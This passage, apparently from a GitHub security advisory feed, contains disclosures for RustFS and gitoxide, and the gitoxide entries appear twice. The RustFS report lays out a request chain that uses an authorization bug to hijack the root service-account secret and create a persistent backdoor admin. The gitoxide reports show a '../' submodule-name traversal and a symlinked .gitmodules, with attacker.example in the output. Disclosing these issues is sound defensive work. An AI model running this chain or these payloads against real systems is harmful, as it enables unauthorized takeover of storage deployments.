<p>This is the damning evidence of inversion. The handler refuses the <strong>correct</strong> permission (<code>admin:ListServiceAccounts</code>) and accepts the <strong>wrong</strong> one (<code>admin:UpdateServiceAccount</code>). There is no superset/subset relationship in the action enum; these are two distinct constants. A deployment that grants its operators <code>admin:ListServiceAccounts</code> to view the service account inventory — the intuitive and documented approach — will see every cross-user list request return 403 until this bug is fixed.</p>
<p>The resource-scoped variant gave the same result as the broad variant:</p>
<pre><code>    # Policy: admin:UpdateServiceAccount on arn:aws:s3:::probe-scope/* (unrelated to any SA)
    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as restricted-update-user -&gt; 200 (same body as probe-user)
</code></pre>
<p>Resource restrictions on admin actions are skipped in <code>crates/policy/src/policy/statement.rs:132</code> (<code>&amp;&amp; !self.is_admin() &amp;&amp; !self.is_sts()</code>), so the bug is equally reachable by an operator whose <code>admin:UpdateServiceAccount</code> grant was scoped to a specific bucket.</p>
<p>And unauthenticated requests are still rejected:</p>
<pre><code>    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  (no signature) -&gt; 403 "Signature is required"
</code></pre>
<p>This is an <strong>authenticated privilege-boundary violation</strong>, not a pre-auth bug.</p>
<h3 id="step-4b--zero-privilege-user-is-correctly-blocked">Step 4b — Zero-privilege user is correctly blocked</h3>
<p>To confirm the bug is in the action constant (not a missing check), created <code>zero-priv-user</code> with <strong>no policies at all</strong>:</p>
<pre><code>    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as zero-priv-user -&gt; 403 AccessDenied
    POST /rustfs/admin/v3/update-service-account?accessKey=root-sa-1  as zero-priv-user -&gt; 403 AccessDenied
    GET /rustfs/admin/v3/list-service-accounts  as zero-priv-user -&gt; 200 {"accounts":[]}  # self-scope only
</code></pre>
<p>The <code>is_allowed</code> check at line 936 fires and correctly blocks zero-priv-user because they have <em>no</em> admin permissions. The bug is not that the check is skipped — it is that the check uses the <strong>wrong action constant</strong>, so it grants access to users holding <code>admin:UpdateServiceAccount</code> (the wrong permission) and denies users holding <code>admin:ListServiceAccounts</code> (the correct permission).</p>
<h3 id="step-5--full-chain-to-rustfs-admin-takeover-persistent-backdoor">Step 5 — Full chain to RustFS admin takeover (persistent backdoor)</h3>
<p>With <code>accessKey=root-sa-1</code> known, <code>probe-user</code> (still only <code>admin:UpdateServiceAccount</code>) hijacks the root service account's secret:</p>
<pre><code>    POST /rustfs/admin/v3/update-service-account?accessKey=root-sa-1  as probe-user
         body: {"newSecretKey":"pwned-secret-2"}                           -&gt; 204 NoContent
</code></pre>
<p>Then re-signs and calls admin APIs as <code>root-sa-1/pwned-secret-2</code>:</p>
<pre><code>    GET /rustfs/admin/v3/list-users  as root-sa-1/pwned-secret-2 -&gt; 200
    {"svinfo-user":{"policyName":"serverinfo-only","status":"enabled",...},
     "probe-user":{"policyName":"list-sa-probe-pol","status":"enabled",...},
     "readonly-user":{"policyName":"readonly","status":"enabled",...},
     "victim-user":{"status":"enabled",...}}

    GET /rustfs/admin/v3/info  as root-sa-1/pwned-secret-2       -&gt; 200
    {"mode":"online","backend":{"backendType":"Erasure","online":...},"buckets":{"count":...},"services":{...}}
</code></pre>
<p>Both endpoints previously returned 403 for <code>probe-user</code>. They now succeed because <code>root-sa-1</code> inherits <code>rustfsadmin</code>'s full authority.</p>
<p>Extending the chain to a persistent backdoor, still driven by <code>probe-user</code>'s hijacked <code>root-sa-1</code> session:</p>
<pre><code>    PUT /rustfs/admin/v3/add-user?accessKey=backdoor-admin                 -&gt; 200  (body: {"secretKey":"backdoor-secret-9","status":"enabled"})
    PUT /rustfs/admin/v3/add-canned-policy?name=proof-admin-all            -&gt; 200  (body: admin:* + s3:*)
    PUT /rustfs/admin/v3/set-user-or-group-policy?userOrGroup=backdoor-admin&amp;isGroup=false&amp;policyName=proof-admin-all -&gt; 200
</code></pre>
<p>Direct authentication as the new admin (no further reliance on the hijacked SA):</p>
<pre><code>    GET /rustfs/admin/v3/list-users  as backdoor-admin/backdoor-secret-9   -&gt; 200 (same full user dump)
    PUT /proof-admin-bucket          as backdoor-admin/backdoor-secret-9   -&gt; 200 (new bucket created on the S3 plane)
</code></pre>
<p>The attacker now owns a persistent admin identity with <code>admin:*</code> and <code>s3:*</code> that will survive secret rotations on <code>root-sa-1</code>. Starting identity was a user granted exactly one admin action.</p>
<h3 id="full-poc-scripts">Full PoC scripts</h3>
<p>Runnable top-to-bottom against a fresh <code>rustfs/rustfs:latest</code> container. Each script prints raw HTTP status codes and response bodies.</p>
<ul>
<li><code>poc/01_setup_probe_user.py</code> — create policies, users, service accounts.</li>
<li><code>poc/02_baseline_probe.py</code> — 403/200 differential on unrelated admin endpoints.</li>
<li><code>poc/03_exploit.py</code> — primary ListServiceAccount enumeration.</li>
<li><code>poc/04_escalate_takeover.py</code> — hijack root-sa-1 and prove admin calls.</li>
<li><code>poc/05_full_root_compromise.py</code> — end-to-end chain including backdoor-admin creation and new bucket.</li>
<li><code>poc/06_differential_and_resource.py</code> — legit-list-user 403 and resource-scoped 200.</li>
</ul>
<h2 id="impact">Impact</h2>
<ol>
<li><p><strong>Full RustFS administrative takeover (Confidentiality: High, Integrity: High, Availability: High).</strong>
A user with a single admin permission (<code>admin:UpdateServiceAccount</code>) chains the list bug with the ownership-free <code>UpdateServiceAccount</code> handler to overwrite any service account's secret — including the root administrator's — and inherit full <code>admin:*</code> + <code>s3:*</code> authority over the RustFS deployment. Demonstrated live: probe-user → list → hijack root-sa-1 → create persistent backdoor-admin → create bucket.</p>
</li>
<li><p><strong>Authorization inversion on a core admin endpoint (Integrity).</strong>
Users granted the intended <code>admin:ListServiceAccounts</code> permission receive 403 on cross-user list requests. A rustfs deployment that issues <code>admin:ListServiceAccounts</code> to its operators (the obvious and documented interpretation of the action name) is silently broken until this is fixed.</p>
</li>
<li><p><strong>Cross-user service-account inventory disclosure (Confidentiality: High).</strong>
Even absent the update-ownership gap, the bug exposes every service account's access key, owning principal, name, description, account status, and expiration to any <code>admin:UpdateServiceAccount</code> holder. This maps the full service-account topology of the cluster and identifies which account to target for a secret rotation attack.</p>
</li>
<li><p><strong>Resource-scoped policies provide no mitigation (Integrity).</strong>
<code>statement.rs:132</code> skips resource matching for admin statements, so restricting <code>admin:UpdateServiceAccount</code> to a specific bucket ARN (the usual pattern for bounded delegation) gives a false sense of isolation and does not reduce the blast radius of this bug.</p>
</li>
</ol>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>The minimal, correct fix is a one-line change at <code>rustfs/src/admin/handlers/service_account.rs:936</code>:</p>
<pre><code>// rustfs/src/admin/handlers/service_account.rs:936
-                    action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
+                    action: Action::AdminAction(AdminAction::ListServiceAccountsAdminAction),
</code></pre>
<p>This brings <code>ListServiceAccount</code> in line with the three sibling handlers (lines 658, 799, 1095) that correctly enforce <code>ListServiceAccountsAdminAction</code>, and restores the documented meaning of the <code>admin:ListServiceAccounts</code> permission for operators who rely on it.</p>
<h3 id="recommended-follow-up-separate-but-related">Recommended follow-up (separate but related)</h3>
<p>Even after this fix, <code>UpdateServiceAccount::call</code> at <code>rustfs/src/admin/handlers/service_account.rs:489-614</code> will still lack any check that the target <code>?accessKey=</code> belongs to the caller (or the caller's parent), so any holder of <code>admin:UpdateServiceAccount</code> who can otherwise obtain the access key of a higher-privileged service account can still hijack it. Consider adding an ownership precondition inside the handler before calling <code>iam_store.update_service_account</code>:</p>
<pre><code>let target = iam_store.get_service_account(&amp;access_key).await
    .map_err(|e| map_service_account_lookup_error(e, "get service account failed"))?;
let caller_parent = if cred.parent_user.is_empty() { cred.access_key.as_str() } else { cred.parent_user.as_str() };
if target.0.parent_user != caller_parent &amp;&amp; !is_owner {
    // Only root or the parent user should be able to mutate this SA.
    // (Or additionally require a dedicated admin action granted to full admins.)
    return Err(s3_error!(AccessDenied, "access denied"));
}
</code></pre>
<p>This additional check closes the secret-rotation primitive for non-root holders of <code>admin:UpdateServiceAccount</code>. It is outside the strict scope of the line-936 typo, but the live PoC shows it is the mechanism by which information disclosure escalates to full administrative takeover, so fixing both in one advisory avoids leaving a usable primitive in place.</p>
<h2 id="self-review">Self-Review</h2>
<ul>
<li><strong>Is this by-design?</strong> No. The three sibling list handlers at lines 658, 799, and 1095 all enforce <code>ListServiceAccountsAdminAction</code>. The action enum has distinct <code>admin:UpdateServiceAccount</code> and <code>admin:ListServiceAccounts</code> strings with no wildcard relationship. There is no comment, test, or docstring suggesting the deviation at line 936 is intentional. CVE-2026-22042 / GHSA-vcwh-pff9-64cc (<code>ImportIam</code> using <code>ExportIAMAction</code>) is the maintainers' own precedent that this class of bug is treated as a real security issue.</li>
<li><strong>Reachability?</strong> Proven live on <code>rustfs/rustfs:latest</code> revision <code>d4ea14c2</code>. Response bodies captured in the report above and in <code>poc/</code> logs.</li>
<li><strong>Is there upstream routing that enforces admin?</strong> No. <code>S3Router::register</code> dispatches directly from <code>service_account.rs:137-141</code> into <code>ListServiceAccount::call</code>; the only authorization is the <code>is_allowed</code> call at line 931-953. Confirmed by the 200 return for <code>probe-user</code> and the 403 return for <code>legit-list-user</code> on the same path.</li>
<li><strong>Prior art?</strong> No existing rustfs advisory covers this handler. <code>CVE-2026-22042</code> is the same <em>class</em> of bug in a different handler; <code>CVE-2026-22043</code> is a <code>deny_only</code> short-circuit bug in the same file but a completely different code path. Both are explicitly distinct from the line 936 typo.</li>
<li><strong>Is the docker image the same code as main?</strong> Yes. Image label <code>org.opencontainers.image.revision=d4ea14c2</code>; <code>git show d4ea14c2:rustfs/src/admin/handlers/service_account.rs</code> at lines 931-960 is byte-identical to <code>git show origin/main:rustfs/src/admin/handlers/service_account.rs</code>. Re-verified on 2026-04-09 at HEAD <code>90e584a</code> — file unchanged since initial commit <code>0a2411f</code>.<ul>
<li>The commented-out ownership check at lines 522-525 of <code>UpdateServiceAccount::call</code> demonstrates the developer was aware an ownership check belonged there but left it disabled. This is not a design decision — it is incomplete implementation that this report's chain exploits.</li>
</ul>
</li>
<li><strong>Honest limitations:</strong><ul>
<li>The primary exploit requires an authenticated principal with <code>admin:UpdateServiceAccount</code>. It is not pre-auth.</li>
<li>Secret keys of the enumerated service accounts are NOT returned by the list handler (they are explicitly cleared elsewhere). Only the access key is disclosed. The escalation to RustFS admin relies on the <em>Update</em> path to overwrite the secret, not on reading a leaked secret.</li>
<li>The full administrative takeover chain depends on the separate <code>UpdateServiceAccount</code> ownership gap. If a reviewer considers that gap out of scope for this report, the line-936 typo on its own is best-rated as <strong>Medium</strong> cross-user information disclosure (<code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code> = 6.5). The live PoC and differential stand independent of that scoping.</li>
<li>The differential (legit-list-user → 403, probe-user → 200) isolates the cause to the handler's action constant and is reproducible in seconds against a fresh container.</li>
</ul>
</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li>Vulnerable file in image: <code>rustfs/src/admin/handlers/service_account.rs</code> @ <code>d4ea14c2ba99602314511d5862005f7b871ece37</code></li>
<li>Vulnerable file at HEAD: <code>rustfs/src/admin/handlers/service_account.rs</code> @ <code>90e584a</code> (file unchanged since <code>0a2411f</code>)</li>
<li>Incorrect action at line 936: <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L931-L953</code></li>
<li>Correct action at line 658 (<code>InfoServiceAccount</code>): <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L658</code></li>
<li>Correct action at line 799 (<code>InfoAccessKey</code>): <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L799</code></li>
<li>Correct action at line 1095 (<code>ListAccessKeysBulk</code>): <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L1095</code></li>
<li>AdminAction enum: <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/policy/src/policy/action.rs#L457-L464</code></li>
<li>UpdateServiceAccount handler (ownership gap): <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L489-L614</code></li>
<li>IamCache::update_service_account: <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/iam/src/manager.rs#L663</code></li>
<li>Admin statements skip resource matching: <code>https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/policy/src/policy/statement.rs#L132</code></li>
<li>rustfs security policy: <code>https://github.com/rustfs/rustfs/security/policy</code></li>
<li>Prior art (same class, different handler): <code>CVE-2026-22042</code> / <code>GHSA-vcwh-pff9-64cc</code></li>
</ul>
<p>Koda Reef</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-mm2q-qcmx-gw4w">https://github.com/rustfs/rustfs/security/advisories/GHSA-mm2q-qcmx-gw4w</a></li>
<li><a href="https://github.com/advisories/GHSA-mm2q-qcmx-gw4w">https://github.com/advisories/GHSA-mm2q-qcmx-gw4w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mm2q-qcmx-gw4w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T20:14:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] gix and gitoxide: unvalidated submodule name traverses out of .git/modules and redirects state() / open() to another repository]]></title>
        <id>https://github.com/advisories/GHSA-fr8x-3vfx-f45h</id>
        <link href="https://github.com/advisories/GHSA-fr8x-3vfx-f45h"/>
        <updated>2026-05-05T19:27:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
<p>attachments:
<a href="https://github.com/user-attachments/files/26431422/pocs.zip">pocs.zip</a></p>
<p>Submodule names coming from <code>.gitmodules</code> are exposed as unvalidated names and are later reused to derive the submodule git directory as:</p>
<pre><code>&lt;superproject common_dir&gt;/modules/&lt;submodule name&gt;
</code></pre>
<p>Because the submodule name is joined directly as a filesystem path component, a name such as <code>../../../escaped-target.git</code> escapes <code>.git/modules</code> after normalization. The current implementation then uses that escaped path in both <code>state()</code> and <code>open()</code>.</p>
<p>The updated PoC demonstrates the real sink, not just string construction:</p>
<ul>
<li><code>state()</code> reports <code>repository_exists=true</code> for the traversed path;</li>
<li><code>open()</code> returns a repository whose normalized <code>common_dir()</code> matches the attacker-chosen repository outside <code>.git/modules</code>.</li>
</ul>
<h2 id="root-cause-analysis"><strong>Root cause analysis</strong></h2>
<p>The relevant flow is:</p>
<ol>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix-submodule/src/access.rs"><code>gix-submodule/src/access.rs</code></a> exposes unvalidated submodule names from configuration.</li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/submodule/mod.rs"><code>gix/src/submodule/mod.rs</code></a> derives the git directory by doing <code>common_dir().join("modules").join(name)</code> with no confinement check.</li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/submodule/mod.rs"><code>gix/src/submodule/mod.rs</code></a> uses that derived path during state resolution and repository opening.</li>
</ol>
<p>There is no normalization-and-confinement step between “submodule name from configuration” and “filesystem path used for repository existence checks / open.” As a result, traversal segments in the submodule name directly influence which repository path is inspected and opened.</p>
<h2 id="reproduce-steps"><strong>Reproduce steps</strong></h2>
<p>Use the attached PoC zip that contains the <code>pocs/</code> workspace.</p>
<ol>
<li><p>Unzip the PoC archive.</p>
</li>
<li><p>Enter <code>pocs/F002</code>.</p>
</li>
<li><p>Run:</p>
<pre><code>cargo run --quiet
</code></pre>
</li>
<li><p>Compare the output with <code>pocs/F002/result.txt</code>.</p>
</li>
</ol>
<p>Key outputs are:</p>
<ul>
<li><code>submodule_name=../../../escaped-target.git</code></li>
<li><code>derived_git_dir_raw=.../.git/modules/../../../escaped-target.git</code></li>
<li><code>derived_git_dir_normalized=.../artifacts/escaped-target.git</code></li>
<li><code>escaped_target=.../artifacts/escaped-target.git</code></li>
<li><code>repository_exists=true</code></li>
<li><code>submodule_opened=true</code></li>
<li><code>opened_common_dir_normalized=.../artifacts/escaped-target.git</code></li>
<li><code>normalized_git_dir_matches_target=true</code></li>
<li><code>opened_common_dir_matches_target=true</code></li>
<li><code>target_outside_modules_root=true</code></li>
</ul>
<p>These outputs show that gitoxide is not only constructing a traversable path string. It is actually using the escaped path for repository existence checks and for opening a repository object.</p>
<h2 id="impact"><strong>Impact</strong></h2>
<p>Confirmed impact:</p>
<ul>
<li>a malicious submodule name can redirect submodule state inspection away from <code>.git/modules/&lt;name&gt;</code> to an attacker-chosen repository path outside <code>.git/modules</code>;</li>
<li><code>Submodule::state()</code> can report repository existence for the wrong repository;</li>
<li><code>Submodule::open()</code> can return a repository object backed by that attacker-chosen path.</li>
</ul>
<p>This is best described as a path-traversal / repository-confusion issue in submodule repository resolution.</p>
<p>This report does <strong>not</strong> claim command execution from this behavior alone. The demonstrated impact is repository redirection: callers that enumerate, inspect, or operate on submodules can be steered into using the wrong repository.</p>
<h2 id="recommended-fix"><strong>Recommended fix</strong></h2>
<p>Two complementary fixes are advisable:</p>
<ol>
<li>do not reuse raw submodule names as filesystem path fragments;<ul>
<li>either use a validated/sanitized name for filesystem derivation,</li>
<li>or derive the storage path from a safe identifier instead of the user-controlled name;</li>
</ul>
</li>
<li>add an explicit confinement check after path derivation;<ul>
<li>normalize or canonicalize the candidate path,</li>
<li>verify that the result stays under <code>&lt;common_dir&gt;/modules</code>,</li>
<li>reject names that contain traversal segments, path separators, or any representation that can escape the modules root.</li>
</ul>
</li>
</ol>
<p>In short, submodule names may remain opaque configuration identifiers, but they should not be treated as trusted filesystem subpaths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-fr8x-3vfx-f45h">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-fr8x-3vfx-f45h</a></li>
<li><a href="https://github.com/advisories/GHSA-fr8x-3vfx-f45h">https://github.com/advisories/GHSA-fr8x-3vfx-f45h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fr8x-3vfx-f45h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:27:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide] gix and gitoxide: unvalidated submodule name traverses out of .git/modules and redirects state() / open() to another repository]]></title>
        <id>https://github.com/advisories/GHSA-fr8x-3vfx-f45h</id>
        <link href="https://github.com/advisories/GHSA-fr8x-3vfx-f45h"/>
        <updated>2026-05-05T19:27:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
<p>attachments:
<a href="https://github.com/user-attachments/files/26431422/pocs.zip">pocs.zip</a></p>
<p>Submodule names coming from <code>.gitmodules</code> are exposed as unvalidated names and are later reused to derive the submodule git directory as:</p>
<pre><code>&lt;superproject common_dir&gt;/modules/&lt;submodule name&gt;
</code></pre>
<p>Because the submodule name is joined directly as a filesystem path component, a name such as <code>../../../escaped-target.git</code> escapes <code>.git/modules</code> after normalization. The current implementation then uses that escaped path in both <code>state()</code> and <code>open()</code>.</p>
<p>The updated PoC demonstrates the real sink, not just string construction:</p>
<ul>
<li><code>state()</code> reports <code>repository_exists=true</code> for the traversed path;</li>
<li><code>open()</code> returns a repository whose normalized <code>common_dir()</code> matches the attacker-chosen repository outside <code>.git/modules</code>.</li>
</ul>
<h2 id="root-cause-analysis"><strong>Root cause analysis</strong></h2>
<p>The relevant flow is:</p>
<ol>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix-submodule/src/access.rs"><code>gix-submodule/src/access.rs</code></a> exposes unvalidated submodule names from configuration.</li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/submodule/mod.rs"><code>gix/src/submodule/mod.rs</code></a> derives the git directory by doing <code>common_dir().join("modules").join(name)</code> with no confinement check.</li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/submodule/mod.rs"><code>gix/src/submodule/mod.rs</code></a> uses that derived path during state resolution and repository opening.</li>
</ol>
<p>There is no normalization-and-confinement step between “submodule name from configuration” and “filesystem path used for repository existence checks / open.” As a result, traversal segments in the submodule name directly influence which repository path is inspected and opened.</p>
<h2 id="reproduce-steps"><strong>Reproduce steps</strong></h2>
<p>Use the attached PoC zip that contains the <code>pocs/</code> workspace.</p>
<ol>
<li><p>Unzip the PoC archive.</p>
</li>
<li><p>Enter <code>pocs/F002</code>.</p>
</li>
<li><p>Run:</p>
<pre><code>cargo run --quiet
</code></pre>
</li>
<li><p>Compare the output with <code>pocs/F002/result.txt</code>.</p>
</li>
</ol>
<p>Key outputs are:</p>
<ul>
<li><code>submodule_name=../../../escaped-target.git</code></li>
<li><code>derived_git_dir_raw=.../.git/modules/../../../escaped-target.git</code></li>
<li><code>derived_git_dir_normalized=.../artifacts/escaped-target.git</code></li>
<li><code>escaped_target=.../artifacts/escaped-target.git</code></li>
<li><code>repository_exists=true</code></li>
<li><code>submodule_opened=true</code></li>
<li><code>opened_common_dir_normalized=.../artifacts/escaped-target.git</code></li>
<li><code>normalized_git_dir_matches_target=true</code></li>
<li><code>opened_common_dir_matches_target=true</code></li>
<li><code>target_outside_modules_root=true</code></li>
</ul>
<p>These outputs show that gitoxide is not only constructing a traversable path string. It is actually using the escaped path for repository existence checks and for opening a repository object.</p>
<h2 id="impact"><strong>Impact</strong></h2>
<p>Confirmed impact:</p>
<ul>
<li>a malicious submodule name can redirect submodule state inspection away from <code>.git/modules/&lt;name&gt;</code> to an attacker-chosen repository path outside <code>.git/modules</code>;</li>
<li><code>Submodule::state()</code> can report repository existence for the wrong repository;</li>
<li><code>Submodule::open()</code> can return a repository object backed by that attacker-chosen path.</li>
</ul>
<p>This is best described as a path-traversal / repository-confusion issue in submodule repository resolution.</p>
<p>This report does <strong>not</strong> claim command execution from this behavior alone. The demonstrated impact is repository redirection: callers that enumerate, inspect, or operate on submodules can be steered into using the wrong repository.</p>
<h2 id="recommended-fix"><strong>Recommended fix</strong></h2>
<p>Two complementary fixes are advisable:</p>
<ol>
<li>do not reuse raw submodule names as filesystem path fragments;<ul>
<li>either use a validated/sanitized name for filesystem derivation,</li>
<li>or derive the storage path from a safe identifier instead of the user-controlled name;</li>
</ul>
</li>
<li>add an explicit confinement check after path derivation;<ul>
<li>normalize or canonicalize the candidate path,</li>
<li>verify that the result stays under <code>&lt;common_dir&gt;/modules</code>,</li>
<li>reject names that contain traversal segments, path separators, or any representation that can escape the modules root.</li>
</ul>
</li>
</ol>
<p>In short, submodule names may remain opaque configuration identifiers, but they should not be treated as trusted filesystem subpaths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-fr8x-3vfx-f45h">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-fr8x-3vfx-f45h</a></li>
<li><a href="https://github.com/advisories/GHSA-fr8x-3vfx-f45h">https://github.com/advisories/GHSA-fr8x-3vfx-f45h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fr8x-3vfx-f45h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:27:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] gix and gitoxide's symlinked .gitmodules are followed and parsed from outside of the repository]]></title>
        <id>https://github.com/advisories/GHSA-pg4w-g64p-qwhj</id>
        <link href="https://github.com/advisories/GHSA-pg4w-g64p-qwhj"/>
        <updated>2026-05-05T19:26:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>attachments:
<a href="https://github.com/user-attachments/files/26431422/pocs.zip">pocs.zip</a></p>
<p>When <code>Repository::submodules()</code> loads submodule metadata, it prefers the worktree <code>.gitmodules</code> file if that path exists. In the current implementation, the path is read with <code>std::fs::read()</code>, which follows symlinks. As a result, a repository can present a symlinked <code>.gitmodules</code> that points outside the repository, and gitoxide will parse the out-of-repository bytes as submodule configuration.</p>
<p>This is a repository-boundary violation. A caller using the high-level submodule API can believe it is reading repository-local submodule metadata, while the bytes are actually coming from an arbitrary file outside the repository tree.</p>
<h2 id="root-cause-analysis">Root cause analysis</h2>
<p>The relevant flow is:</p>
<ol>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/repository/location.rs"><code>gix/src/repository/location.rs</code></a> derives the worktree <code>.gitmodules</code> path as <code>workdir/.gitmodules</code>.</li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/repository/submodule.rs"><code>gix/src/repository/submodule.rs</code></a> reads that path with <code>std::fs::read(&amp;path)</code> and immediately parses the bytes as a submodule configuration file.</li>
<li><code>Repository::submodules()</code> exposes the parsed entries through the high-level API.</li>
</ol>
<p>The issue is not in the parser. The issue is that the worktree path is treated as an ordinary file without checking whether it is a symlink, and without checking whether the canonicalized target remains inside the repository worktree.</p>
<p>Because <code>std::fs::read()</code> follows symlinks, a malicious repository can cause gitoxide to ingest bytes from an attacker-chosen location outside the repository. The resulting <code>Submodule</code> objects then expose <code>name</code>, <code>path</code>, and <code>url</code> values derived from that external file.</p>
<h2 id="reproduction-steps">Reproduction steps</h2>
<p>Use the attached PoC zip that contains the <code>pocs/</code> workspace.</p>
<ol>
<li><p>Unzip the PoC archive.</p>
</li>
<li><p>Enter <code>pocs/F001</code>.</p>
</li>
<li><p>Run:</p>
<pre><code class="language-bash">cargo run --quiet
</code></pre>
</li>
<li><p>Compare the output with <code>pocs/F001/result.txt</code>.</p>
</li>
</ol>
<p>Important outputs include:</p>
<ul>
<li><code>gitmodules_symlink=.../victim-repo/.gitmodules</code></li>
<li><code>symlink_target=.../outside/modules.conf</code></li>
<li><code>parsed_name=symlinked</code></li>
<li><code>parsed_path=deps/symlinked</code></li>
<li><code>parsed_url=https://attacker.example/symlinked.git</code></li>
</ul>
<p>These outputs show that gitoxide parsed the submodule configuration from the symlink target outside the repository, not from repository-local bytes.</p>
<h2 id="impact">Impact</h2>
<p>Confirmed impact:</p>
<ul>
<li>out-of-repository bytes can be injected into the result of <code>Repository::submodules()</code>;</li>
<li>callers can be misled about submodule metadata such as <code>name</code>, <code>path</code>, and <code>url</code>;</li>
<li>any downstream workflow that uses those values to decide clone, fetch, update, or policy behavior is operating on attacker-controlled data that did not actually originate from the repository tree.</li>
</ul>
<p>This report does <strong>not</strong> claim direct command execution from this code path by itself. The demonstrated impact is metadata injection across the repository boundary.</p>
<h2 id="recommended-fix">Recommended fix</h2>
<p>A safe fix is to stop silently following symlinks for the worktree <code>.gitmodules</code> path in this loading path.</p>
<p>Reasonable options include:</p>
<ol>
<li>use <code>symlink_metadata()</code> / <code>lstat</code>style checks and reject symlinked <code>.gitmodules</code> when loading from the worktree;</li>
<li>canonicalize the target and verify that it still resides under the repository worktree before reading it;</li>
<li>for security-sensitive callers, prefer loading <code>.gitmodules</code> from the index or <code>HEAD</code> tree rather than following the worktree path.</li>
</ol>
<p>At minimum, the worktree path should not silently follow symlinks to arbitrary external files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-pg4w-g64p-qwhj">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-pg4w-g64p-qwhj</a></li>
<li><a href="https://github.com/advisories/GHSA-pg4w-g64p-qwhj">https://github.com/advisories/GHSA-pg4w-g64p-qwhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pg4w-g64p-qwhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:26:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide] gix and gitoxide's symlinked .gitmodules are followed and parsed from outside of the repository]]></title>
        <id>https://github.com/advisories/GHSA-pg4w-g64p-qwhj</id>
        <link href="https://github.com/advisories/GHSA-pg4w-g64p-qwhj"/>
        <updated>2026-05-05T19:26:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>attachments:
<a href="https://github.com/user-attachments/files/26431422/pocs.zip">pocs.zip</a></p>
<p>When <code>Repository::submodules()</code> loads submodule metadata, it prefers the worktree <code>.gitmodules</code> file if that path exists. In the current implementation, the path is read with <code>std::fs::read()</code>, which follows symlinks. As a result, a repository can present a symlinked <code>.gitmodules</code> that points outside the repository, and gitoxide will parse the out-of-repository bytes as submodule configuration.</p>
<p>This is a repository-boundary violation. A caller using the high-level submodule API can believe it is reading repository-local submodule metadata, while the bytes are actually coming from an arbitrary file outside the repository tree.</p>
<h2 id="root-cause-analysis">Root cause analysis</h2>
<p>The relevant flow is:</p>
<ol>
<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/repository/location.rs"><code>gix/src/repository/location.rs</code></a> derives the worktree <code>.gitmodules</code> path as <code>workdir/.gitmodules</code>.</li>
